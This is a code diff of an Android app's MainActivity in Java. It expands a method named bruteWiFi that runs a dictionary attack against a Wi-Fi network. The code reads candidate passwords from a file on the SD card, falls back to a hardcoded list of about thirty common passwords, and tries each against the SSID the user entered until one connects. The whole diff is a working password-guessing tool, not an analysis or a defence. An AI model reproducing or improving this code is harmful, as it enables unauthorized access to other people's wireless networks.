@@ -14,6 +14,8 @@ import android.widget.TextView;
 import android.util.Log;
 import org.w3c.dom.Text;
 
+import java.io.BufferedReader;
+import java.io.FileReader;
 import java.io.PrintWriter;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
@@ -39,24 +41,47 @@ public class MainActivity extends AppCompatActivity {
     }
 
     public void bruteWiFi(View view) {
-        try {
-            PrintWriter w = new PrintWriter("List.txt", "UTF-8");
-            w.printf("%d num", 5);
-            w.close();
-        } catch (Exception e){
+        boolean readFromDefault = true;
+        String FilePassList[] = {};
+        String DefaultPassList[] = {"00000000", "87654321", "12345678", "000000000", "123456789", "88888888", "888888888",
+                "99999999", "999999999", "qwertyui", "qwertyuio", "password", "qwertyuiop", "administrator", "superman",
+                "password1", "password12", "password123", "password1234", "password12345", "password123456", "baseball",
+                "football", "1234567890", "123123123", "0987654321", "gfhjkm", "1q2w3e4r5t6y", "q1w2e3r4t5y6", "baltika9",
+                "russia2018", "russia2019", "medvedev", "leningrad", "eskander"};
+        try{
+            String line;
+            String data = "";
+            BufferedReader br = new BufferedReader(new FileReader("/sdcard/data/list.txt"));
+            while((line = br.readLine()) != null){
+                data += line;
+            }
+            FilePassList = data.split(";");
+            readFromDefault = false;
+            br.close();
 
-        }
-        WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
-        TextView errorView = (TextView) findViewById(R.id.errorV);
-        EditText ssidEdit = (EditText) findViewById(R.id.ssid);
-        wifi.setWifiEnabled(true);
-        String ssid = ssidEdit.getText().toString();
-        boolean res = false;
-        String passList[] = {"00000000", "87654321", "12345678"};
-        for (String i : passList) {
-            res = connectToUnknown(wifi, ssid, i, true);
-            if(res)
-                break;
+        } catch(Exception e) {
+            readFromDefault = true;
+
+        } finally {
+            WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            TextView errorView = (TextView) findViewById(R.id.errorV);
+            EditText ssidEdit = (EditText) findViewById(R.id.ssid);
+            wifi.setWifiEnabled(true);
+            String ssid = ssidEdit.getText().toString();
+            boolean res = false;
+            if(readFromDefault) {
+                for (String i : DefaultPassList) {
+                    res = connectToUnknown(wifi, ssid, i, true);
+                    if (res)
+                        break;
+                }
+            } else {
+                for (String i : FilePassList) {
+                    res = connectToUnknown(wifi, ssid, i, true);
+                    if (res)
+                        break;
+                }
+            }
         }
         /*
         int pass_len = 8;
